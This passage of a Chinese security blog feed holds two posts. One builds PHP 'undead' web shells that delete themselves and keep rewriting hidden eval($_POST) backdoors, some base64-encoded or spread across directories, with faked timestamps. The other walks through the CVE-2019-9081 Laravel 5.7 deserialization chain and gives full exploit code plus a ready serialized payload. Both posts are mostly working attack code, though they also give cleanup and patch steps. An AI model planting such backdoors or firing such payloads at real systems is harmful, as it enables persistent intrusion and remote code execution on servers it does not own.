punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//删除文件本身，以起到隐蔽自身的作用。</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'2.php'</span><span class="token punctuation">;</span> <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'&lt;?php if(md5($_GET["pass"])=="1a1dc91c907325c69271ddf0c944bc72"){@eval($_POST[a]);} ?&gt;'</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//将一个字符串写入文件</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'touch -m -d "2021-09-07 09:10:12" .2.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">usleep</span><span class="token punctuation">(</span><span class="token number">5000</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>具体的思路就是，就是让客户机断开的时候，不死马也是可以运行</p><p>然后不断的生成新的后门文件</p><p>把自己删除，达到隐藏的目的</p><p><code>.</code>为前缀的文件，还可以隐藏后门文件本身</p><p>我们来试一下</p><p>测试环境为 kali 虚拟机</p><p><img src="https://i.loli.net/2021/11/22/1GoacIBSRg4QXhN.png" alt="image-20210907132103742"></p><p>在实验环境下创建马来模拟真是环境</p><p>查看一下进程</p><p><img src="https://i.loli.net/2021/11/22/VLjAq7MSm93HIlw.png" alt="image-20210907132225334"></p><p>这是实验开始前的进程</p><p>然后给予<code>shell.php</code>文件的权限 然后运行一下</p><p><img src="https://i.loli.net/2021/11/22/uAwjymF9PZ1Joke.png" alt="image-20210907132313930"></p><p>可以看到 原生成文件已经自我删除</p><p>查看进程</p><p><img src="https://i.loli.net/2021/11/22/4WTXMlfYLK9Opwe.png" alt="image-20210907132351627"></p><p>已经写入到内存</p><p>我们尝试删除生成的shell文件</p><p><img src="https://i.loli.net/2021/11/22/uAwjymF9PZ1Joke.png" alt="image-20210907132446906"></p><p>会迅速再生</p><p>而且打开文件会提示一直在修改</p><p><img src="https://i.loli.net/2021/11/22/OkM4wEdVWvxDLYo.png" alt="image-20210907132525337"></p><p>此时解决办法：</p><p>1、查看进程然后kill掉进程最后删除木马</p><p>2、重启然后删除木马</p><p><img src="https://i.loli.net/2021/11/22/ycZmj2gdNIUEYur.png" alt="image-20210907132636730"></p><p>成功清楚木马文件</p><p>当然这只是最简单的木马文件</p><p>下面我们来改进一下</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">ignore_user_abort</span><span class="token punctuation">(</span><span class="token boolean constant">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">set_time_limit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">unlink</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'2.php'</span><span class="token punctuation">;</span><span class="token variable">$code</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'&lt;?php if(md5($_GET["pass"])=="1a1dc91c907325c69271ddf0c944bc72"){@eval($_POST[a]);} ?&gt;'</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'touch -m -d "2018-12-01 09:10:12" .2.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">usleep</span><span class="token punctuation">(</span><span class="token number">5000</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果我们将</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">$code = '<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"pass"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token double-quoted-string string">"1a1dc91c907325c69271ddf0c944bc72"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>@<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span>a<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token delimiter important">?&gt;</span></span>';<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注释掉就可以绕过这个shell</p><p>所以我们可以采用将shell<code>base64</code>加密</p><p>同时进行md5校验</p><p>这样更加安全</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">ignore_user_abort</span><span class="token punctuation">(</span><span class="token boolean constant">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">set_time_limit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'c.php'</span><span class="token punctuation">;</span> <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'PD9waHAgZXZhbCgkX1BPU1RbY10pOz8+'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token boolean constant">true</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token function">usleep</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>emmm 貌似php不死马 目前我只能写这么多了</p><p>但是有个弊端</p><p>被攻击者更换目录，或者把目录移走</p><p>木马就会失效，所以我们可以遍历文件夹每个都写</p><p>随便激活一个即可</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">set_time_limit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ignore_user_abort</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">unlink</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'index.php'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">md5_file</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'{name}'</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token single-quoted-string string">'912d7b3bbd5cf7405c9cc8f16156321b'</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'{name}'</span><span class="token punctuation">,</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'PD9waHAgZXZhbChiYXNlNjRfZGVjb2RlKCRfUE9TVFtoM10pKTs/Pg=='</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'{name}'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token function">unlink</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'{name}'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="学习" scheme="http://h3geeker.top/categories/%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="网络安全" scheme="http://h3geeker.top/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2019-9081 Laravel5.7 反序列化 RCE</title>
    <link href="http://h3geeker.top/posts/598866b.html"/>
    <id>http://h3geeker.top/posts/598866b.html</id>
    <published>2021-11-16T02:34:48.025Z</published>
    <updated>2021-11-16T02:37:26.243Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="CVE-2019-9081-Laravel5-7-反序列化-RCE"><a href="#CVE-2019-9081-Laravel5-7-反序列化-RCE" class="headerlink" title="CVE-2019-9081 Laravel5.7 反序列化 RCE"></a>CVE-2019-9081 Laravel5.7 反序列化 RCE</h1><h3 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h3><p>Laravel Framework 5.7.x版本中的Illuminate组件存在反序列化漏洞，远程攻击者可利用该漏洞执行代码</p><h3 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h3><p>Laravel5.7</p><h3 id="三、漏洞分析"><a href="#三、漏洞分析" class="headerlink" title="三、漏洞分析"></a>三、漏洞分析</h3><p>laravel在5.7之后加入了PendingCommand类，同时发现了两个方法</p><p><img src="https://i.loli.net/2021/11/16/QJVs3bT5HLGeDlY.png" alt="1"></p><p>PendingCommand类有魔术方法<code>__destruct()</code>，该方法调用run函数，然后run函数执行命令</p><p>我们跟进看一下构造方法</p><p><img src="https://i.loli.net/2021/11/16/AJFnG615LRbcTwS.png" alt="2"></p><p>一共需要用到4个属性</p><p>我们继续跟进run方法看一下</p><p><img src="https://i.loli.net/2021/11/16/fWX7a29x8SJQyN6.png" alt="3"></p><p>注意<code>$this-&gt;mockConsoleOutput();</code></p><p>我们跟进看一下</p><p><img src="https://i.loli.net/2021/11/16/kXVS5qRcluPmKix.png" alt="4"></p><p>继续跟进<code>createABufferedOutputMock()</code></p><p><img src="https://i.loli.net/2021/11/16/F2Sd7EVGBPHvRiJ.png" alt="5"></p><p>继续走下去，我们需要属性<code>$this-&gt;test-&gt;expectedOutput</code></p><p><img src="https://i.loli.net/2021/11/16/fIu5PDMEKNGA4oX.png" alt="6"></p><p>我们需要找到类中用<code>expectedOutput</code></p><p>经过全局搜索，在<code>Illuminate\Foundation\Testing\Concerns</code>，存在</p><p>但是这种类，需要用魔法方法<strong>get</strong>，来实例化</p><p>在<code>vendor/laravel/framework/src/Illuminate/Auth/GenericUser.php</code>中存在可以利用的get方法</p><p><img src="https://i.loli.net/2021/11/16/bFyxKcRXeYvZj5i.png" alt="7"></p><p>设置键名为<code>expectedOutput</code>的数组，即可利用</p><p>现在就缺<code>$app</code>参数，我们回去接着跟进<code>run</code>方法</p><p><img src="https://i.loli.net/2021/11/16/knuNHLgR3lcYxMV.png" alt="8"></p><p>这里也很重要</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">app</span><span class="token punctuation">[</span>Kernel<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token keyword">class</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里在实例化对象,再去调对应的call方法，跟着<code>Kerne</code>可以看到是在实例化</p><pre class="line-numbers language-none"><code class="language-none">Illuminate\Contracts\Console\Kernel<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>首先进入到</p><p><img src="https://i.loli.net/2021/11/16/4DZAIVs2bjJKNm3.png" alt="9"></p><p>跟进make方法</p><p><img src="https://i.loli.net/2021/11/16/M7bIvLSij9oOsJf.png" alt="10"></p><p>跟进父类的make</p><p><img src="https://i.loli.net/2021/11/16/Q92vURy1LT6PFSp.png" alt="11"></p><p>跟进resolve</p><p><img src="https://i.loli.net/2021/11/16/s1FCPTB5jKWHuS6.png" alt="12"></p><p>那么此时发现$concrete的值来自于getConcrete($abstract):</p><pre class="line-numbers language-none"><code class="language-none">vendor/laravel/framework/src/Illuminate/Container/Container.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>跟进getConcrete</p><p><img src="https://i.loli.net/2021/11/16/x2QcRqS1OID9uAy.png" alt="13"></p><p>注意这里</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">bindings</span><span class="token punctuation">[</span><span class="token variable">$abstract</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">bindings</span><span class="token punctuation">[</span><span class="token variable">$abstract</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'concrete'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>如果bindings[$abstract]存在，则会返回bindings[$abstract][‘concrete’]</p><p>bindings是类Container的属性，并且类Container中也有可以RCE的call方法。</p><p>到现在，我们可以整理一下思路</p><pre class="line-numbers language-none"><code class="language-none">我们可以任意实例化类Container的子类，这样在其子类调用call的时候，会触发类Container的call方法，那么即可达成RCE<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>我们选择<code>Illuminate\Foundation\Application</code>而$abstract的值为Illuminate\Contracts\Console\Kernel。<br>那么此时我们容易知道$bindings只要存在键名为Illuminate\Contracts\Console\Kernel的数组，就能进入该if条件句，那么我们只要按如下进行构造：</p><pre class="line-numbers language-none"><code class="language-none">1.类PendingCommand 利用 destruct触发run()方法2.类vendor/laravel/framework/src/Illuminate/Auth/GenericUser.php 构造数组3.类vendor/laravel/framework/src/Illuminate/Auth/GenericUser.php 利用 get()魔法方法满足mockConsoleOutput4.利用任意实例化对象，实例化Illuminate\Foundation\Application5.调用call触发父类call方法RCE<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>exp如下:</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">Illuminate<span class="token punctuation">\</span>Foundation<span class="token punctuation">\</span>Testing</span><span class="token punctuation">{</span>    <span class="token keyword">class</span> <span class="token class-name">PendingCommand</span><span class="token punctuation">{</span>        <span class="token keyword">protected</span> <span class="token variable">$command</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$parameters</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$app</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token variable">$test</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$command</span><span class="token punctuation">,</span> <span class="token variable">$parameters</span><span class="token punctuation">,</span><span class="token variable">$class</span><span class="token punctuation">,</span><span class="token variable">$app</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">command</span> <span class="token operator">=</span> <span class="token variable">$command</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">parameters</span> <span class="token operator">=</span> <span class="token variable">$parameters</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">test</span><span class="token operator">=</span><span class="token variable">$class</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">app</span><span class="token operator">=</span><span class="token variable">$app</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">Illuminate<span class="token punctuation">\</span>Auth</span><span class="token punctuation">{</span>    <span class="token keyword">class</span> <span class="token class-name">GenericUser</span><span class="token punctuation">{</span>        <span class="token keyword">protected</span> <span class="token variable">$attributes</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token keyword">array</span> <span class="token variable">$attributes</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">attributes</span> <span class="token operator">=</span> <span class="token variable">$attributes</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">Illuminate<span class="token punctuation">\</span>Foundation</span><span class="token punctuation">{</span>    <span class="token keyword">class</span> <span class="token class-name">Application</span><span class="token punctuation">{</span>        <span class="token keyword">protected</span> <span class="token variable">$hasBeenBootstrapped</span> <span class="token operator">=</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$bindings</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$bind</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">bindings</span><span class="token operator">=</span><span class="token variable">$bind</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span><span class="token punctuation">{</span>    <span class="token variable">$genericuser</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Illuminate<span class="token punctuation">\</span>Auth<span class="token punctuation">\</span>GenericUser</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"expectedOutput"</span><span class="token operator">=</span><span class="token operator">&gt;</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"0"</span><span class="token operator">=</span><span class="token operator">&gt;</span><span class="token double-quoted-string string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"expectedQuestions"</span><span class="token operator">=</span><span class="token operator">&gt;</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"0"</span><span class="token operator">=</span><span class="token operator">&gt;</span><span class="token double-quoted-string string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$application</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Illuminate<span class="token punctuation">\</span>Foundation<span class="token punctuation">\</span>Application</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Illuminate\Contracts\Console\Kernel"</span><span class="token operator">=</span><span class="token operator">&gt;</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"concrete"</span><span class="token operator">=</span><span class="token operator">&gt;</span><span class="token double-quoted-string string">"Illuminate\Foundation\Application"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$pendingcommand</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Illuminate<span class="token punctuation">\</span>Foundation<span class="token punctuation">\</span>Testing<span class="token punctuation">\</span>PendingCommand</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"phpinfo"</span><span class="token punctuation">,</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'1'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$genericuser</span><span class="token punctuation">,</span><span class="token variable">$application</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$pendingcommand</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="四、漏洞复现"><a href="#四、漏洞复现" class="headerlink" title="四、漏洞复现"></a>四、漏洞复现</h3><p>在<code>routes/web.php</code>添加一条路由</p><pre class="line-numbers language-none"><code class="language-none">Route::get('/index', 'TaskController@index');<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>接下来在<code>app/Http/Controllers</code>文件夹下创建文件<code>TaskController.php</code>，源码如下:</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">App<span class="token punctuation">\</span>Http<span class="token punctuation">\</span>Controllers</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">TaskController</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$code</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token double-quoted-string string">"Welcome to H3'palce"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>利用exp生成payload</p><p>然后传值过去</p><p>payload：</p><pre class="line-numbers language-none"><code class="language-none">http://127.0.0.1/public/index.php/index?code=O%3A44%3A%22Illuminate%5CFoundation%5CTesting%5CPendingCommand%22%3A4%3A%7Bs%3A10%3A%22%00%2A%00command%22%3Bs%3A7%3A%22phpinfo%22%3Bs%3A13%3A%22%00%2A%00parameters%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A1%3A%221%22%3B%7Ds%3A6%3A%22%00%2A%00app%22%3BO%3A33%3A%22Illuminate%5CFoundation%5CApplication%22%3A2%3A%7Bs%3A22%3A%22%00%2A%00hasBeenBootstrapped%22%3Bb%3A0%3Bs%3A11%3A%22%00%2A%00bindings%22%3Ba%3A1%3A%7Bs%3A35%3A%22Illuminate%5CContracts%5CConsole%5CKernel%22%3Ba%3A1%3A%7Bs%3A8%3A%22concrete%22%3Bs%3A33%3A%22Illuminate%5CFoundation%5CApplication%22%3B%7D%7D%7Ds%3A4%3A%22test%22%3BO%3A27%3A%22Illuminate%5CAuth%5CGenericUser%22%3A1%3A%7Bs%3A13%3A%22%00%2A%00attributes%22%3Ba%3A2%3A%7Bs%3A14%3A%22expectedOutput%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A1%3A%221%22%3B%7Ds%3A17%3A%22expectedQuestions%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A1%3A%221%22%3B%7D%7D%7D%7D<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2021/11/16/jpRwXSLBDPMr5FT.png" alt="14"></p><h3 id="五、漏洞修复"><a href="#五、漏洞修复" class="headerlink" title="五、漏洞修复"></a>五、漏洞修复</h3><p>1、删除__destruct中的$this-&gt;run()代码段</p><p>2、更新到新版本</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="CVE复现" scheme="http://h3geeker.top/categories/CVE%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="CVE漏洞复现" scheme="http://h3geeker.top/tags/CVE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    <category term="CVE-2019-9081" scheme="http://h3geeker.top/tags/CVE-2019-9081/"/>
    
  </entry>
  
  <entry>
    <title>Nepnep两岁生日</title>
    <link href="http://h3geeker.top/posts/ba1d201b.html"/>
    <id>http://h3geeker.top/posts/ba1d201b.html</id>
    <published>2021-11-15T14:27:46.711Z</published>
    <updated>2021-11-16T02:19:11.273Z</updated>
    
